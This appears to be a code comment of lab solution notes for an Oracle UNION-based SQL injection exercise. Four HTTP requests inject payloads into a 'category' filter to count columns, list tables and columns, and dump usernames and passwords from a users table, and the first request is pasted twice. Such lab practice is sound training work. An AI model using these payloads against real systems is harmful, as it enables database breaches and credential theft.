/*

1) GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+all_tables-- HTTP/2GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+all_tables-- HTTP/2

2) GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2
//USERS_XIVHJR

3) GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XIVHJR'-- HTTP/2
//PASSWORD_USHPLC
//USERNAME_IBKYRQ

4) GET /filter?category='+UNION+SELECT+PASSWORD_USHPLC,USERNAME_IBKYRQ+FROM+USERS_XIVHJR-- HTTP/2





*/